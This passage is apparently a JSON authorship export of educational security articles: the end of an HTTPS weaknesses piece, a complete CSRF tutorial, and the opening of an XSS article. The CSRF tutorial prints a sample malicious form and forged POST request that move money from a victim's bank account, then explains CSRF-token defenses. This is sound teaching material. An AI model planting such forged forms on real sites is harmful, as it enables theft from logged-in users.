        "content": "As aforementioned, Certificate Authority (CA) signs a digital certificate provided by the server to prove the identity of the server. However, in the real-world implementation, the CA does not sign the digital certificate directly, rather CA signs the fixed length [hashed digest][17] of the digital certificate for efficiency. This introduces the possibility of two different digital certificates with the same hashed digest. Thus, if the attackers manage to forge a fake digital certificate with the same hashed digest of another valid digital certificate, the browser would trust the attackers server and all the servers signed by the attackers. This loophole occurs with SHA-1 hashing algorithm and SHA-1 is no longer used in HTTPS after 2016. In 2017, Google has announced an algorithm to forge a duplicated SHA-1 hash and the report is [here][18]. A more detailed explanation of this problem is found [here][19]."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "#### Weak Diffie-Hellman Attack"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "During the [cipher suite negotiation][20] process of HTTPS, client and server send each other in plain text the HTTPS standard they support and the most secure standard is chosen to be used. However, this can be exploited for HTTPS downgrade by a [man in the middle attack][21]. The man in the middle could send forged cipher suite negotiation to both server and client to indicate the maximum security supported is only 512 bits Diffie Hellman and trick server and client to encrypt with 512 bits Diffie Hellman. At the moment, without knowing the keys, 512 bits Diffie Hellman algorithm could be decrypted with sufficient resources. A more detailed description could be found [here][22]"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Session Hijacking on Partially Protected Websites"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "Some websites use HTTPS only on the login page to encrypt the login credentials of users. However, this is vulnerable to [session hijacking][23] attack. Most websites use cookies and session tokens to maintain a stateful connection with its users, and the session token is embedded into each packet to authenticate the identity of users. Without using HTTPS in all the websites in the domain, the packets containing session token is transmitted in plaintext and sniffers can easily obtain the session token to impersonate the victim. A demonstration of this attack on Qoo10.com user can be found [here][24]"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "## Conclusion"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "HTTPS provides security to a web application.  If the web application requires secure network traffic (e.g. online banking), HTTPS should be implemented. However, servers usually need to pay for the digital certificate used by HTTPS. Also, the additional layer of encryption and decryption adds overhead to network traffic (though the impact is not significant). If secure network traffic is not required (e.g. University home page), HTTPS may not be used."
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "[1]: https://github.com/boxin-yang"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "[2]: https://searchsoftwarequality.techtarget.com/definition/session-ID"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "[3]: https://github.com/codebutler/firesheep"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "[4]: https://www.facebook.com/notes/facebook-engineering/secure-browsing-by-default/10151590414803920/"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "[5]: https://searchnetworking.techtarget.com/definition/Network-tap"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "[6]: https://en.wikipedia.org/wiki/Domain_Name_System"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "[7]: https://en.wikipedia.org/wiki/Address_Resolution_Protocol"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "[8]: https://en.wikipedia.org/wiki/DNS_spoofing"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "[9]: https://en.wikipedia.org/wiki/ARP_spoofing"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "[10]: https://www.digicert.com/ssl.htm"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "[11]: ../security/cryptography.md"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "[12]: https://en.wikipedia.org/wiki/Time_complexity#Sub-exponential_time"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "[13]: https://www.globalsign.com/en-sg/ssl-information-center/what-are-certification-authorities-trust-hierarchies/"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "[14]: https://www.digicert.com"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "[15]: https://www.digicert.com/ssl-certificate-installation.htm"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "[16]: https://letsencrypt.org/"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "[17]: https://en.wikipedia.org/wiki/Cryptographic_hash_function"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "[18]: https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html?m\u003d1"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "[19]: https://www.sott.net/article/275524-Why-HTTPS-and-SSL-are-not-as-secure-as-you-think"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "[20]: https://en.wikipedia.org/wiki/Cipher_suite"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "[21]: https://en.wikipedia.org/wiki/Man-in-the-middle_attack"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "[22]: https://weakdh.org/"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "[23]: https://en.wikipedia.org/wiki/Session_hijacking"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "[24]: https://www.youtube.com/watch?v\u003dBjTwNzoMUuk"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 4,
      "jamessspanggg": 2,
      "iskandarzulkarnaien": 10,
      "-": 94
    }
  },
  {
    "path": "contents/security/crossSiteRequestForgery/crossSiteRequestForgery.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Cross Site Request Forgery (CSRF)"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Cross Site Request Forgery (CSRF)"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Tran Tien Dat](https://github.com/tran-tien-dat)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Flow of a CSRF attack‎](#flow-of-a-csrf-attack)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Step 1: The victim logs in to a vulnerable web service‎](#step-1-the-victim-logs-in-to-a-vulnerable-web-service)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Step 2: The victim visits an untrusted website controlled by the attacker‎](#step-2-the-victim-visits-an-untrusted-website-controlled-by-the-attacker)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Step 3: The untrusted website makes requests to the vulnerable web service on the victim\u0027s behalf‎](#step-3-the-untrusted-website-makes-requests-to-the-vulnerable-web-service-on-the-victim-s-behalf)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Conditions for a successful CSRF attack‎](#conditions-for-a-successful-csrf-attack)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Defense against CSRF attacks‎](#defense-against-csrf-attacks)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [References‎](#references)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Cross-Site Request Forgery (CSRF) is a dangerous type of attack that has affected major sites like [Gmail](http://archive.oreilly.com/pub/post/gmail_exploit_contact_list_hij.html) and [Netflix](https://blog.jeremiahgrossman.com/2006/10/more-on-netflixs-csrf-advisory.html) in the past. This article attempts to give an easy-to-digest introduction to the attack and how to protect your website from it."
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Flow of a CSRF Attack"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "A CSRF attack tricks the victim to perform actions that they do not intend to do on a web application in which they\u0027re currently authenticated. It generally consists of 3 steps:"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "1. The victim logs in to a vulnerable web service"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "2. The victim visits an untrusted website controlled by the attacker"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "3. The untrusted website makes requests to the vulnerable web service on the victim\u0027s behalf"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "These steps are best explained through an example. Suppose that Alice is a customer of the banking website `www.example-bank.com`. Alice wants to transfer money to her friend Bob (because she does not like the fact that he keeps paying for her meals when they go out together). "
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Step 1: The Victim Logs in to a Vulnerable Web Service"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "Alice first logs in to the website at `www.example-bank.com/login`, providing her username and password. She then clicks on a hyperlink on the site to go to the URL `www.example-bank.com/transfer` to perform her transaction. Note that Alice does not have to enter her username and password again, but the bank still knows that the request is made by her. This is done through a mechanism of the HTTP protocol called a [HTTP Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies). A *cookie* is a small piece of information that is sent along with all HTTP requests to a particular website. In our case, after receiving Alice\u0027s credentials for logging in, the bank instructs Alice\u0027s browser to store a *cookie* `auth\u003d1abcd2ek3292fsa390sdf` and **send this cookie together with every subsequent request** to `www.example-bank.com`. Thus, once the web server sees this cookie in the request, it knows that this is an authenticated request from Alice. Many websites use this cookie mechanism so that users only have to log in once."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "At `www.example-bank.com/transfer`, Alice fills out the following HTML form to transfer money to Bob:"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "```HTML"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cform action\u003d\"/transfer\" method\u003d\"POST\"\u003e"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"text\" name\u003d\"receiver-name\" value\u003d\"Bob\"/\u003e"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"number\" name\u003d\"receiver-account-no\" value\u003d\"123456\"/\u003e"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"number\" name\u003d\"amount\" value\u003d\"100\"/\u003e"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"submit\"/\u003e"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/form\u003e"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "As Alice clicks the submit button, the browser will send the following request to `www.example-bank.com`:"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "POST https://www.example-bank.com/transfer HTTP/1.1"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "Cookie: auth\u003d1abcd2ek3292fsa390sdf"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "receiver-name\u003dBob\u0026receiver-account-no\u003d123456\u0026amount\u003d100"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "The bank\u0027s server verifies that the cookie `auth\u003d1abcd2ek3292fsa390sdf` is valid and is associated with Alice. It then proceeds to transfer $100 from Alice\u0027s account to account number 123456, which belongs to Bob."
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Step 2: The Victim Visits an Untrusted Website Controlled by the Attacker"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "Alice then receives a chat message from her not-so-trustworthy friend, Eve:"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "Eve: OMG Alice! This site is selling the shoes you have always"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "     wanted for half the price: www.i-am-not-evil.com/shoes"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "Excited by this piece of news, Alice clicks on the hyperlink to check out `www.i-am-not-evil.com`."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Step 3: The Untrusted Website Makes Requests to the Vulnerable Web Service on the Victim\u0027s Behalf"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "While browsing `www.i-am-not-evil.com`, Alice clicks on the `View more pictures` button on the website to see more pictures of her favorite pair of shoes. Unbeknownst to her, that button has the following HTML code:"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "```HTML"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003cform action\u003d\"https://www.example-bank.com/transfer\" method\u003d\"POST\"\u003e"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"text\" name\u003d\"receiver-name\" value\u003d\"Eve\"/\u003e"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"number\" name\u003d\"receiver-account-no\" value\u003d\"987654\"/\u003e"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"number\" name\u003d\"amount\" value\u003d\"100000\"/\u003e"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"submit\" value\u003d\"View more pictures\"/\u003e"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/form\u003e"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "So, when she clicks that button, the browser actually sends the following request to `https://www.example-bank.com`:"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "POST https://www.example-bank.com/transfer HTTP/1.1"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "Cookie: auth\u003d1abcd2ek3292fsa390sdf"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "receiver-name\u003dEve\u0026receiver-account-no\u003d987654\u0026amount\u003d100000"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "Since Alice is still logged in to `www.example-bank.com`, the browser automatically attaches the cookie `auth\u003d1abcd2ek3292fsa390sdf` to any requests made to `www.example-bank.com`. Hence, the bank\u0027s server considers this as an authenticated request from Alice and proceeds to transfer $100,000 from Alice\u0027s account to account number 987654, which belongs to the attacker!"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Conditions for a Successful CSRF Attack"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "From the example, we can see that a CSRF attack works by forging a valid request which **inherits the identity and privileges of the victim** on the vulnerable web server. Such inheritance of privileges is possible because the browser attaches any credentials associated with a website to all requests made to the site. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim. In short, there are 3 conditions necessary for the attack:"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "1. The target website is vulnerable to a CSRF attack (i.e. it cannot distinguish between forged and legitimate requests)."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "2. The victim is authenticated to the target website."
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "3. The victim is tricked to visit an untrusted website by social engineering."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "*Note: [Social engineering](https://en.wikipedia.org/wiki/Social_engineering_%28security%29) refers to psychological manipulation of people into performing actions. In our example, Eve shares a link with a description that matches Alice\u0027s interest, which increases the chance that Alice will follow the link. Thus, this action is a form of social engineering.*"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Defense Against CSRF Attacks"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "Both users and websites can take actions to defend themselves against CSRF attacks. As the user, one can reduce the likelihood of being attacked by logging out of sensitive services like banking immediately after carrying out transactions. This will negate condition number 2. Condition number 3 can be mitigated if the user is extremely careful and never visits websites they do not know. However, users generally do not follow this and just click on interesting links they encounter on social media. Hence, this threat of social engineering could never be fully eliminated."
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "As for the web server, it can eliminate condition number 1 by adding a secret token as a hidden field to all forms that it serves. This token should be random and cannot be guessed by the attacker. Back to our example, the bank website should use a form like the following:"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "```HTML"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cform action\u003d\"/transfer\" method\u003d\"POST\"\u003e"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"hidden\" name\u003d\"csrf-token\" value\u003d\"abcd23ksk3l2faad2kdkl\"/\u003e"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"text\" name\u003d\"receiver-name\" value\u003d\"Bob\"/\u003e"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"number\" name\u003d\"receiver-account-no\" value\u003d\"123456\"/\u003e"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"number\" name\u003d\"amount\" value\u003d\"100\"/\u003e"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cinput type\u003d\"submit\"/\u003e"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/form\u003e"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "So a valid request by Alice made from the bank\u0027s own website will also carry this secret token `csrf-token\u003dabcd23ksk3l2faad2kdkl`. Since the token is added by the bank\u0027s website on its webpages, forged requests from other websites will not know the token. Thus, when the bank\u0027s server receives a request, it can distinguish between a legitimate and a forged request by checking that the CSRF token is present and valid."
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "## References"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "- https://owasp.org/www-community/attacks/csrf (A more technical description of the attack)"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "- https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html (In-depth discussion of the various defense approaches, including those that do not work)"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- https://www.cgisecurity.com/csrf-faq.html (Short FAQs about CSRF)"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "- https://docs.djangoproject.com/en/2.0/ref/csrf/ (CSRF Protection in Django)"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 6,
      "jamessspanggg": 6,
      "madanalogy": 2,
      "iskandarzulkarnaien": 10,
      "-": 112
    }
  },
  {
    "path": "contents/security/crossSiteScripting/crossSiteScripting.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Cross Site Scripting"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "# Cross Site Scripting (XSS)"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": "**Authors: [Chester Sng](https://github.com/ChesterSng), [Tan Wang Leng](https://github.com/nus-oss/cs3281-website/tree/master/students/AY1617S2/tanWangLeng/TanWangLeng-Resume.md)**"
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Bryan Lew](https://github.com/blewjy), [Jeremy Choo](https://github.com/ChooJeremy), [Heng Le](https://github.com/initialshl)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is XSS?‎](#what-is-xss)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why do you need to know about XSS?‎](#why-do-you-need-to-know-about-xss)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How does XSS work?‎](#how-does-xss-work)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Types of XSS‎](#types-of-xss)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Well-Known XSS Incidents‎](#well-known-xss-incidents)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
